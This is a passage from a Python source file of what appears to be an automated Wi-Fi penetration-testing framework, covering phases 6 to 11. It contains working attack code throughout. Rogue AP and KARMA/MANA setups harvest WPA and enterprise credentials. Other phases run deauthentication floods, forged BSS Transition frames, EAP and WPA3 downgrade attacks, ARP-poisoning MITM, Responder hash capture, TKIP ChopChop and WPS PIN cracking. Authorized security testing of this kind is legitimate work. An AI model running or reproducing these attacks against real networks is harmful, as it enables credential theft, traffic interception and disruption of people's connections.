                "rogue_ap_clients",
                data=findings_data,
                output_file=str(rogue_dir / "rogue_ap_results.json"),
                title_override=f"Clients Auto-Associated to Rogue AP: {ssid}",
            )
        if captured_psk:
            finding_from_cat(
                "psk_phished",
                data=findings_data,
                output_file=str(rogue_dir / "rogue_ap_results.json"),
                title_override=f"WPA Passphrase Captured via Phishing Portal: {ssid}",
            )
        log(f"Phase 6: Complete — {len(connected_clients)} client(s) connected"
            + (f", PSK captured" if captured_psk else ""))

    finally:
        stop_portal.set()
        if use_portal:
            _iptables_captive_teardown(ap_iface)
        for proc in (hostapd_proc, dnsmasq_proc):
            if proc and proc.poll() is None:
                _kill_proc(proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)

    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "complete")


# ── Phase 6b: KARMA / MANA ────────────────────────────────────────────────────

def phase_karma(monitor_iface: str, primary_iface: str, output_dir: Path,
                rogue_cfg: dict, timeout: int) -> None:
    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "running")

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 6b: No second wireless interface — skipping KARMA.")
        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
        return

    karma_dir = output_dir / "karma"
    karma_dir.mkdir(exist_ok=True)
    duration  = int(rogue_cfg.get("portal_duration", 120))

    # Prefer hostapd-mana; fall back to bettercap
    hostapd_mana = shutil.which("hostapd-mana")
    bettercap    = shutil.which("bettercap")

    if hostapd_mana:
        conf_content = (
            "interface=" + ap_iface + "\n"
            "driver=nl80211\n"
            "ssid=FreeWiFi\n"
            "hw_mode=g\n"
            "channel=6\n"
            "mana_wpe=1\n"
            "mana_credout=" + str(karma_dir / "karma_credentials.txt") + "\n"
            "enable_mana=1\n"
            "enable_sycophant=1\n"
        )
        conf_path = karma_dir / "hostapd_mana.conf"
        conf_path.write_text(conf_content, encoding="utf-8")
        log(f"Phase 6b: Starting KARMA attack via hostapd-mana on {ap_iface}")
        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
            status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "error")
            return
        dm_conf  = _write_dnsmasq_conf(ap_iface, karma_dir)
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        karma_proc = subprocess.Popen(
            [hostapd_mana, str(conf_path)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(duration)
        _kill_proc(karma_proc)
        _kill_proc(dnsmasq_proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)
        cred_file = karma_dir / "karma_credentials.txt"
        if cred_file.exists():
            creds = cred_file.read_text(encoding="utf-8", errors="replace")
            if creds.strip():
                finding_from_cat(
                    "karma_credentials",
                    data={"credentials_raw": creds[:2000]},
                    output_file=str(cred_file),
                    title_override="WPA-Enterprise Credentials Captured via KARMA/MANA Attack",
                )
                log(f"Phase 6b: Credentials captured — see {cred_file}")
            else:
                log("Phase 6b: No credentials captured.")
        else:
            log("Phase 6b: No credential output generated.")

    elif bettercap:
        log(f"Phase 6b: Starting KARMA via bettercap on {monitor_iface}")
        bc_script = karma_dir / "karma.cap"
        bc_script.write_text(
            "wifi.recon on\n"
            f"set wifi.interface {monitor_iface}\n"
            "wifi.assoc.flood on\n"
            f"set events.stream.output {karma_dir}/karma_events.txt\n",
            encoding="utf-8",
        )
        try:
            out, rc = _run(
                ["bettercap", "-iface", monitor_iface, "-caplet", str(bc_script)],
                timeout=duration,
            )
            (karma_dir / "bettercap.log").write_text(out, encoding="utf-8")
        except Exception as exc:
            err(f"Phase 6b: bettercap error: {exc}")
    else:
        log("Phase 6b: Neither hostapd-mana nor bettercap found — skipping KARMA.")
        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
        return

    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "complete")


# ── Phase 7: Client-Side / Management Frame Attacks ───────────────────────────

def _send_btm_request(monitor_iface: str, client_mac: str,
                      ap_bssid: str, channel: int) -> bool:
    try:
        from scapy.all import RadioTap, Dot11, Raw, sendp  # type: ignore
    except ImportError:
        return False
    try:
        btm_body = bytes([
            10,          # Category: WNM (Wireless Network Management)
            7,           # Action: BSS Transition Management Request
            0x01,        # Dialog Token
            0x11,        # Request Mode: Preferred Candidate List | ESS Disassociation Imminent
            0x00, 0x00,  # Disassociation Timer: 0 TBTTs (immediate)
            0xFF,        # Validity Interval: 255 TBTTs
        ])
        frame = (
            RadioTap() /
            Dot11(type=0, subtype=13,
                  addr1=client_mac, addr2=ap_bssid, addr3=ap_bssid) /
            Raw(load=btm_body)
        )
        sendp(frame, iface=monitor_iface, count=5, inter=0.1, verbose=False)
        return True
    except Exception:
        return False


def phase_client_attacks(monitor_iface: str, target_aps: list,
                          enriched_aps: list, output_dir: Path, timeout: int) -> None:
    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "running")
    aps = target_aps or enriched_aps
    ca_dir = output_dir / "client_attacks"
    ca_dir.mkdir(exist_ok=True)
    results = {"pmf": [], "btm": [], "probes": []}

    # ── 7a: PMF enforcement ───────────────────────────────────────────────────
    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "running")
    for ap in aps:
        bssid   = ap.get("bssid", "")
        ssid    = ap.get("ssid", "")
        channel = int(ap.get("channel") or 6)
        clients = ap.get("clients") or []
        if not bssid:
            continue

        enc_field = (ap.get("encryption") or "") + " " + (ap.get("auth") or "")
        pmf_required  = bool(re.search(r"\bMFPR\b|\bSAE\b|WPA3", enc_field, re.I))
        pmf_capable   = bool(re.search(r"\bMFPC\b|\bPMF\b", enc_field, re.I)) or pmf_required

        # Attempt deauth against first observed client
        deauth_worked = None
        if clients:
            client_mac = clients[0]["mac"]
            out, rc = _run([
                "aireplay-ng", "--deauth", "10",
                "-a", bssid, "-c", client_mac, monitor_iface,
            ], timeout=20)
            deauth_worked = rc == 0 and "Sending 802.11 deauthentication" in out
        else:
            # Broadcast deauth
            out, rc = _run([
                "aireplay-ng", "--deauth", "5", "-a", bssid, monitor_iface,
            ], timeout=15)
            deauth_worked = rc == 0

        finding_text = (
            f"PMF Required: {pmf_required} | PMF Capable: {pmf_capable} | "
            f"Deauth {'accepted' if deauth_worked else 'blocked'}"
        )
        result = {
            "ssid": ssid, "bssid": bssid,
            "pmf_required": pmf_required, "pmf_capable": pmf_capable,
            "deauth_effective": deauth_worked,
        }
        results["pmf"].append(result)
        log(f"Phase 7a PMF [{bssid}]: {finding_text}")

        if not pmf_required:
            finding_from_cat(
                "pmf_not_enforced",
                data=result,
                output_file=str(ca_dir / "pmf_results.json"),
                title_override=f"PMF Not Required: Management Frames Unprotected on {ssid}",
            )

    (ca_dir / "pmf_results.json").write_text(json.dumps(results["pmf"], indent=2), encoding="utf-8")
    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "complete")

    # ── 7b: BSS Transition Management hijacking ────────────────────────────────
    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "running")
    btm_results = []
    if not shutil.which("python3") or True:  # scapy check happens inside _send_btm_request
        for ap in aps:
            bssid   = ap.get("bssid", "")
            ssid    = ap.get("ssid", "")
            channel = int(ap.get("channel") or 6)
            for client in (ap.get("clients") or []):
                client_mac = client.get("mac", "")
                if not client_mac:
                    continue
                log(f"Phase 7b: Sending BTM Request to {client_mac} → {ssid!r} [{bssid}]")
                sent = _send_btm_request(monitor_iface, client_mac, bssid, channel)
                btm_results.append({
                    "ssid": ssid, "bssid": bssid,
                    "client": client_mac, "sent": sent,
                })
                if sent:
                    finding_from_cat(
                        "btm_hijack",
                        data={"ssid": ssid, "bssid": bssid, "client": client_mac},
                        output_file=str(ca_dir / "btm_results.json"),
                        title_override=f"BSS Transition Management Request Sent to {client_mac} on {ssid}",
                    )
        if not btm_results:
            log("Phase 7b: No associated clients found for BTM targeting.")
    (ca_dir / "btm_results.json").write_text(json.dumps(btm_results, indent=2), encoding="utf-8")
    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "complete")

    # ── 7c: Probe request harvest analysis ────────────────────────────────────
    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "running")
    probe_data = []
    for ap in enriched_aps:
        for client in (ap.get("clients") or []):
            mac     = client.get("mac", "")
            probes  = client.get("probes") or client.get("probe_ssids") or []
            if mac and probes:
                probe_data.append({"client_mac": mac, "probed_ssids": probes,
                                    "seen_on_bssid": ap.get("bssid", "")})
                log(f"Phase 7c: {mac} probing: {', '.join(probes)}")
    if probe_data:
        (ca_dir / "probe_harvest.json").write_text(
            json.dumps(probe_data, indent=2), encoding="utf-8"
        )
        finding_from_cat(
            "probe_harvest",
            data={"count": len(probe_data), "clients": probe_data},
            output_file=str(ca_dir / "probe_harvest.json"),
            title_override=f"Client Preferred Network List Harvested: {len(probe_data)} Device(s)",
        )
    else:
        log("Phase 7c: No probe request data available from Phase 0-I.")
    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "complete")

    results["btm"]    = btm_results
    results["probes"] = probe_data
    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "complete")


# ── Phase 8: EAP Downgrade ────────────────────────────────────────────────────

def phase_eap_downgrade(monitor_iface: str, target_aps: list,
                         eaphammer_path: str, output_dir: Path, timeout: int) -> None:
    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "running")

    enterprise_aps = [
        ap for ap in target_aps
        if re.search(r"MGT|EAP|Enterprise|802\.1[Xx]",
                     (ap.get("auth") or "") + " " + (ap.get("encryption") or ""), re.I)
    ]
    if not enterprise_aps:
        log("Phase 8: No WPA-Enterprise APs in scope — skipping EAP downgrade.")
        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
        return

    ep_path = Path(eaphammer_path) if Path(eaphammer_path).exists() else Path(
        shutil.which("eaphammer") or "/opt/eaphammer/eaphammer"
    )
    if not ep_path.exists():
        log("Phase 8: eaphammer not found — skipping EAP downgrade.")
        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
        return

    dg_dir = output_dir / "eap_downgrade"
    dg_dir.mkdir(exist_ok=True)

    for ap in enterprise_aps:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = int(ap.get("channel") or 6)
        log(f"Phase 8: Downgrade attack on {ssid!r} [{bssid}]")
        cred_file = dg_dir / f"creds_{bssid.replace(':','')}.txt"
        cmd = [
            str(ep_path), "--interface", monitor_iface,
            "--essid", ssid, "--channel", str(channel),
            "--auth", "wpa-eap",
            "--creds",
            "--negotiate", "balanced",  # allows downgrade to weaker EAP methods
        ]
        if bssid:
            cmd += ["--bssid", bssid]
        try:
            out, rc = _run(cmd, timeout=min(timeout, 120))
            (dg_dir / f"eaphammer_{bssid.replace(':','')}.log").write_text(
                out, encoding="utf-8"
            )
            cred_lines = [l for l in out.splitlines()
                          if re.search(r"username|password|mschapv2|credential", l, re.I)]
            if cred_lines:
                cred_file.write_text("\n".join(cred_lines), encoding="utf-8")
                finding_from_cat(
                    "eap_downgrade_creds",
                    data={"ssid": ssid, "bssid": bssid,
                          "credentials_raw": "\n".join(cred_lines[:20])},
                    output_file=str(cred_file),
                    title_override=f"EAP Downgrade: Credentials Captured from {ssid}",
                )
                log(f"Phase 8: Credentials captured for {ssid!r}")
            else:
                log(f"Phase 8: No credentials captured for {ssid!r}")
        except Exception as exc:
            err(f"Phase 8: eaphammer error for {ssid!r}: {exc}")

    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "complete")


# ── Phase 9: SAE Transition Mode Downgrade ────────────────────────────────────

def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
                         target_aps: list, enriched_aps: list,
                         output_dir: Path, rogue_cfg: dict, timeout: int) -> None:
    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "running")

    aps = target_aps or enriched_aps
    wpa3_transition = [
        ap for ap in aps
        if re.search(r"SAE|WPA3", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
        and re.search(r"WPA2|PSK", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
    ]
    if not wpa3_transition:
        log("Phase 9: No WPA3/WPA2 transition-mode APs found — skipping.")
        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
        return

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 9: No second wireless interface for downgrade AP — skipping.")
        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
        return

    dg_dir = output_dir / "sae_downgrade"
    dg_dir.mkdir(exist_ok=True)

    for ap in wpa3_transition:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = int(ap.get("channel") or 6)
        log(f"Phase 9: WPA2-only rogue AP targeting {ssid!r} [{bssid}] (transition mode)")

        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
            continue
        ha_conf = _write_hostapd_conf(ssid, "", channel, "OPEN", "", ap_iface, dg_dir)
        dm_conf = _write_dnsmasq_conf(ap_iface, dg_dir)

        cap_file = dg_dir / f"sae_dg_{bssid.replace(':','')}.cap"
        airodump_proc = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "-c", str(channel),
             "-w", str(dg_dir / f"sae_dg_{bssid.replace(':','')}"),
             "--output-format", "pcap", monitor_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        with open(dg_dir / "hostapd_sae.log", "w") as hlog:
            hostapd_proc = subprocess.Popen(
                ["hostapd", str(ha_conf)], stdout=hlog, stderr=hlog,
            )

        duration = min(timeout, 120)
        log(f"Phase 9: Rogue AP active for {duration}s — monitoring for WPA2 associations")
        time.sleep(duration)

        for proc in (hostapd_proc, dnsmasq_proc, airodump_proc):
            _kill_proc(proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)

        # Look for captured handshakes
        caps = list(dg_dir.glob(f"sae_dg_{bssid.replace(':','')}*.cap"))
        handshake_found = False
        if caps and shutil.which("aircrack-ng"):
            for cap in caps:
                chk, _ = _run(["aircrack-ng", "-a", "2", str(cap)], timeout=30)
                if re.search(r"1 handshake", chk, re.I):
                    handshake_found = True
                    break

        result = {
            "ssid": ssid, "bssid": bssid,
            "downgrade_attempted": True,
            "handshake_captured": handshake_found,
        }
        (dg_dir / "sae_downgrade_results.json").write_text(
            json.dumps(result, indent=2), encoding="utf-8"
        )
        finding_from_cat(
            "sae_transition_downgrade",
            data=result,
            output_file=str(dg_dir / "sae_downgrade_results.json"),
            title_override=f"WPA3 SAE Transition Mode Downgrade Tested: {ssid}",
        )
        log(f"Phase 9: {ssid!r} — handshake {'captured' if handshake_found else 'not captured'}")

    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "complete")


# ── Phase 10: Post-Connection Attacks ─────────────────────────────────────────

def _get_ap_dhcp_clients(ap_iface: str) -> list:
    clients = []
    for lease_path in [Path("/var/lib/misc/dnsmasq.leases"),
                        Path("/var/lib/dnsmasq/dnsmasq.leases")]:
        if lease_path.exists():
            try:
                for line in lease_path.read_text().splitlines():
                    parts = line.split()
                    if len(parts) >= 3:
                        clients.append({"mac": parts[1], "ip": parts[2]})
            except Exception:
                pass
    if not clients and shutil.which("arp"):
        out, _ = _run(["arp", "-i", ap_iface, "-n"], timeout=10)
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 3 and parts[2] != "<incomplete>":
                clients.append({"ip": parts[0], "mac": parts[2]})
    return clients


def _detect_local_range(ap_iface: str) -> str:
    try:
        out, _ = _run(["ip", "addr", "show", ap_iface], timeout=5)
        m = re.search(r"inet\s+([\d.]+/\d+)", out)
        if m:
            net = ipaddress.IPv4Interface(m.group(1)).network
            return str(net)
    except Exception:
        pass
    return _CAPTIVE_CIDR


def phase_post_connection(ap_iface: str, output_dir: Path,
                           post_cfg: dict, timeout: int) -> None:
    status("p10_post", "Phase 10: Post-Connection Attacks", "running")

    if not ap_iface:
        log("Phase 10: No AP interface configured — skipping post-connection attacks.")
        status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
        return

    pc_dir = output_dir / "post_connection"
    pc_dir.mkdir(exist_ok=True)

    network_range = post_cfg.get("scan_range") or _detect_local_range(ap_iface)
    duration      = int(post_cfg.get("duration", 120))
    clients       = _get_ap_dhcp_clients(ap_iface)
    log(f"Phase 10: Interface={ap_iface}  Network={network_range}  "
        f"Clients={len(clients)}")

    # ── 10a: ARP Poisoning / MITM ─────────────────────────────────────────────
    if post_cfg.get("arp_poison", True):
        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "running")
        arpspoof = shutil.which("arpspoof")
        bettercap = shutil.which("bettercap")
        arp_results = {"targets": [], "tool": None}

        if arpspoof and clients:
            subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
                           check=False, capture_output=True)
            gateway = _CAPTIVE_IP
            procs = []
            for cl in clients[:5]:  # limit to 5 targets
                target_ip = cl.get("ip", "")
                if not target_ip or target_ip == gateway:
                    continue
                log(f"Phase 10a: ARP poisoning {target_ip} ↔ {gateway}")
                p1 = subprocess.Popen(
                    ["arpspoof", "-i", ap_iface, "-t", target_ip, gateway],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                p2 = subprocess.Popen(
                    ["arpspoof", "-i", ap_iface, "-t", gateway, target_ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                procs.extend([p1, p2])
                arp_results["targets"].append(target_ip)
            arp_results["tool"] = "arpspoof"
            time.sleep(min(duration // 2, 60))
            for p in procs:
                _kill_proc(p)
        elif bettercap and clients:
            log("Phase 10a: ARP poisoning via bettercap")
            bc_script = pc_dir / "arp.cap"
            targets_str = ",".join(c.get("ip", "") for c in clients[:5] if c.get("ip"))
            bc_script.write_text(
                f"set arp.spoof.targets {targets_str}\n"
                "arp.spoof on\n"
                f"sleep {min(duration//2, 60)}\n"
                "arp.spoof off\n"
                "quit\n",
                encoding="utf-8",
            )
            out, _ = _run(
                ["bettercap", "-iface", ap_iface, "-caplet", str(bc_script)],
                timeout=min(duration // 2, 70),
            )
            (pc_dir / "bettercap_arp.log").write_text(out, encoding="utf-8")
            arp_results["tool"] = "bettercap"
        else:
            log("Phase 10a: arpspoof/bettercap not found or no clients — skipping ARP poison.")

        (pc_dir / "arp_results.json").write_text(
            json.dumps(arp_results, indent=2), encoding="utf-8"
        )
        if arp_results["targets"]:
            finding_from_cat(
                "arp_poison",
                data=arp_results,
                output_file=str(pc_dir / "arp_results.json"),
                title_override=f"ARP Poisoning MITM: {len(arp_results['targets'])} Target(s) Poisoned",
            )
        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "complete")

    # ── 10b: LLMNR / NBT-NS / mDNS Poisoning ─────────────────────────────────
    if post_cfg.get("llmnr_poison", True):
        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "running")
        responder_bin = (
            shutil.which("responder") or
            shutil.which("Responder") or
            "/opt/Responder/Responder.py"
        )
        responder_path = Path(responder_bin) if responder_bin else None

        if responder_path and responder_path.exists():
            log(f"Phase 10b: Responder on {ap_iface} for {min(duration, 90)}s")
            resp_log = pc_dir / "responder.log"
            cmd = (["python3", str(responder_path)]
                   if responder_path.suffix == ".py"
                   else [str(responder_path)])
            cmd += ["-I", ap_iface, "-w", "-d", "-f", "--lm"]
            try:
                with open(resp_log, "w") as rlog:
                    proc = subprocess.Popen(cmd, stdout=rlog, stderr=rlog)
                time.sleep(min(duration, 90))
                _kill_proc(proc)
                raw = resp_log.read_text(encoding="utf-8", errors="replace")
                hashes = re.findall(
                    r"(NTLMv[12]|LM|NTHash)[^\n]*\n([^\n]+)", raw
                )
                responder_dir = Path("/usr/share/responder/logs")
                if not responder_dir.exists():
                    responder_dir = Path("/opt/Responder/logs")
                captured_hashes = []
                if responder_dir.exists():
                    for hf in sorted(responder_dir.glob("*.txt"))[-5:]:
                        try:
                            content = hf.read_text(encoding="utf-8", errors="replace")
                            if content.strip():
                                captured_hashes.append({
                                    "file": str(hf), "content": content[:500]
                                })
                                (pc_dir / hf.name).write_text(content, encoding="utf-8")
                        except Exception:
                            pass
                if captured_hashes or hashes:
                    finding_from_cat(
                        "llmnr_hashes",
                        data={"hashes_captured": len(captured_hashes),
                              "interface": ap_iface},
                        output_file=str(resp_log),
                        title_override="LLMNR/NBT-NS Credential Hashes Captured",
                    )
                    log(f"Phase 10b: {len(captured_hashes)} hash file(s) captured")
                else:
                    log("Phase 10b: Responder ran — no hashes captured.")
            except Exception as exc:
                err(f"Phase 10b: Responder error: {exc}")
        else:
            log("Phase 10b: Responder not found — skipping LLMNR poisoning.")
        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "complete")

    # ── 10c: Internal Network Port Scan ───────────────────────────────────────
    if post_cfg.get("port_scan", True):
        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "running")
        if not shutil.which("nmap"):
            log("Phase 10c: nmap not installed — skipping port scan.")
        else:
            log(f"Phase 10c: Scanning {network_range} with nmap")
            scan_dir = pc_dir / "nmap"
            scan_dir.mkdir(exist_ok=True)
            out_base = str(scan_dir / "scan")
            out, rc  = _run(
                ["nmap", "-sV", "--open", "-T4", "-O",
                 "-oA", out_base, network_range],
                timeout=min(timeout, 300),
            )
            (scan_dir / "nmap.log").write_text(out, encoding="utf-8")
            # Parse for interesting hosts
            hosts = re.findall(
                r"Nmap scan report for ([\d.]+)\n(.*?)(?=Nmap scan report|\Z)",
                out, re.S,
            )
            interesting = []
            for host_ip, host_body in hosts:
                open_ports = re.findall(r"(\d+/(?:tcp|udp)\s+open\s+\S+)", host_body)
                if open_ports:
                    interesting.append({"ip": host_ip, "ports": open_ports})
            if interesting:
                (scan_dir / "interesting_hosts.json").write_text(
                    json.dumps(interesting, indent=2), encoding="utf-8"
                )
                finding_from_cat(
                    "internal_hosts",
                    data={"network": network_range, "hosts": interesting},
                    output_file=str(scan_dir / "interesting_hosts.json"),
                    title_override=f"Internal Network Hosts Discovered: {len(interesting)} Target(s)",
                )
                log(f"Phase 10c: {len(interesting)} host(s) with open ports found")
            else:
                log("Phase 10c: No hosts with open ports found.")
        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "complete")

    status("p10_post", "Phase 10: Post-Connection Attacks", "complete")


# ── Phase 11: Legacy / Niche Attacks ─────────────────────────────────────────

def phase_legacy_attacks(monitor_iface: str, target_aps: list,
                          enriched_aps: list, output_dir: Path,
                          tools: dict, timeout: int) -> None:
    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "running")
    aps    = target_aps or enriched_aps
    lg_dir = output_dir / "legacy_attacks"
    lg_dir.mkdir(exist_ok=True)

    # ── 11a: TKIP ChopChop / Fragmentation ────────────────────────────────────
    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "running")
    tkip_aps = [
        ap for ap in aps
        if re.search(r"\bTKIP\b", ap.get("cipher") or ap.get("encryption") or "", re.I)
    ]
    if tkip_aps:
        tkip_dir = lg_dir / "tkip"
        tkip_dir.mkdir(exist_ok=True)
        for ap in tkip_aps:
            bssid   = ap.get("bssid", "")
            ssid    = ap.get("ssid", "")
            clients = ap.get("clients") or []
            client_mac = clients[0]["mac"] if clients else "FF:FF:FF:FF:FF:FF"
            log(f"Phase 11a: TKIP detected on {ssid!r} [{bssid}] — attempting ChopChop")
            finding_from_cat(
                "tkip_detected",
                data={"ssid": ssid, "bssid": bssid},
                output_file=str(tkip_dir / "tkip_findings.json"),
                title_override=f"TKIP Cipher in Use (Deprecated): {ssid}",
            )
            # Attempt ChopChop with auto-accept first packet
            try:
                proc = subprocess.Popen(
                    ["aireplay-ng", "--chopchop", "-b", bssid,
                     "-h", client_mac, "-D", monitor_iface],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                )
                out_bytes, _ = proc.communicate(input=b"y\n", timeout=min(timeout, 60))
                out_text = out_bytes.decode("utf-8", errors="replace")
                (tkip_dir / f"chopchop_{bssid.replace(':','')}.txt").write_text(
                    out_text, encoding="utf-8"
                )
                if re.search(r"Saving chosen packet|\.xor", out_text, re.I):
                    log(f"Phase 11a: ChopChop XOR keystream obtained for {ssid!r}")
                    finding_from_cat(
                        "tkip_chopchop",
                        data={"ssid": ssid, "bssid": bssid},
                        output_file=str(tkip_dir / f"chopchop_{bssid.replace(':','')}.txt"),
                        title_override=f"TKIP ChopChop XOR Keystream Extracted: {ssid}",
                    )
                else:
                    log(f"Phase 11a: ChopChop did not produce keystream for {ssid!r}")
            except subprocess.TimeoutExpired:
                log(f"Phase 11a: ChopChop timed out for {ssid!r}")
            except Exception as exc:
                err(f"Phase 11a: ChopChop error: {exc}")
    else:
        log("Phase 11a: No TKIP-cipher APs found — skipping TKIP attacks.")
    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "complete")

    # ── 11b: Wi-Fi Direct / P2P WPS ──────────────────────────────────────────
    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "running")
    p2p_dir = lg_dir / "wifidirect"
    p2p_dir.mkdir(exist_ok=True)
    p2p_devices = []

    # Scan with wash for WPS devices
    if shutil.which("wash"):
        log("Phase 11b: Scanning for WPS/P2P devices with wash")
        out, rc = _run(["wash", "-i", monitor_iface, "-s", "-j"], timeout=min(timeout, 60))
        (p2p_dir / "wash_output.txt").write_text(out, encoding="utf-8")
        for line in out.splitlines():
            m = re.search(
                r"((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+.*?\s+(\d+)\s+.*?(DIRECT-\S+|\S+)",
                line
            )
            if m or "DIRECT-" in line:
                bssid_m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
                ssid_m  = re.search(r"(DIRECT-\S+)", line)
                chan_m  = re.search(r"\b(\d{1,3})\b", line)
                if bssid_m:
                    p2p_devices.append({
                        "bssid": bssid_m.group(1),
                        "ssid":  ssid_m.group(1) if ssid_m else "",
                        "channel": int(chan_m.group(1)) if chan_m else 0,
                    })

    # Also scan iw for P2P-capable devices
    if shutil.which("iw"):
        out, _ = _run(["iw", "dev", monitor_iface, "scan"], timeout=30)
        for block in re.split(r"(?=BSS [0-9a-f:]{17})", out):
            if "P2P" not in block and "DIRECT-" not in block:
                continue
            bssid_m = re.search(r"BSS\s+([0-9a-f:]{17})", block)
            ssid_m  = re.search(r'SSID:\s+(DIRECT-\S+)', block)
            chan_m  = re.search(r"DS Parameter set:\s+channel\s+(\d+)", block)
            if bssid_m:
                entry = {
                    "bssid": bssid_m.group(1),
                    "ssid": ssid_m.group(1) if ssid_m else "",
                    "channel": int(chan_m.group(1)) if chan_m else 0,
                }
                if entry["bssid"] not in {d["bssid"] for d in p2p_devices}:
                    p2p_devices.append(entry)

    if p2p_devices:
        (p2p_dir / "p2p_devices.json").write_text(
            json.dumps(p2p_devices, indent=2), encoding="utf-8"
        )
        log(f"Phase 11b: {len(p2p_devices)} Wi-Fi Direct device(s) found")
        for device in p2p_devices:
            bssid   = device["bssid"]
            ssid    = device.get("ssid", "")
            channel = device.get("channel", 6) or 6
            log(f"Phase 11b: Attempting WPS PIN attack on {ssid!r} [{bssid}]")
            reaver = shutil.which("reaver")
            if reaver:
                out, rc = _run(
                    [reaver, "-i", monitor_iface, "-b", bssid,
                     "-c", str(channel), "-S", "-N", "-d", "1",
                     "-t", "5", "-vv"],
                    timeout=min(timeout, 120),
                )
                (p2p_dir / f"reaver_{bssid.replace(':','')}.txt").write_text(
                    out, encoding="utf-8"
                )
                if re.search(r"WPS PIN|WPA PSK|pin found", out, re.I):
                    finding_from_cat(
                        "wifidirect_wps_cracked",
                        data={"bssid": bssid, "ssid": ssid},
                        output_file=str(p2p_dir / f"reaver_{bssid.replace(':','')}.txt"),
                        title_override=f"Wi-Fi Direct WPS PIN Obtained: {ssid} [{bssid}]",
                    )
                    log(f"Phase 11b: WPS PIN obtained for {ssid!r}")
            finding_from_cat(
                "wifidirect_found",
                data={"bssid": bssid, "ssid": ssid, "channel": channel},
                output_file=str(p2p_dir / "p2p_devices.json"),
                title_override=f"Wi-Fi Direct / P2P Device Discovered: {ssid or bssid}",
            )
    else:
        log("Phase 11b: No Wi-Fi Direct / P2P devices found.")
    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "complete")

    # ── 11c: Captive Portal Bypass ────────────────────────────────────────────
    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "running")
    cp_dir = lg_dir / "captive_bypass"
    cp_dir.mkdir(exist_ok=True)

    bypass_results = []
    # These tests require outbound connectivity on some interface
    test_targets = [
        ("dns_external",  "DNS to external resolver", "1.1.1.1"),
        ("http_ip",       "HTTP to known IP",         "http://1.1.1.1"),
        ("https_ip",      "HTTPS to known IP",        "https://1.1.1.1"),
    ]
    for test_id, test_name, target in test_targets:
        result = {"test": test_name, "target": target, "success": False, "detail": ""}
        try:
            if test_id == "dns_external":
                import socket as _sock
                old_timeout = _sock.getdefaulttimeout()
                _sock.setdefaulttimeout(5)
                try:
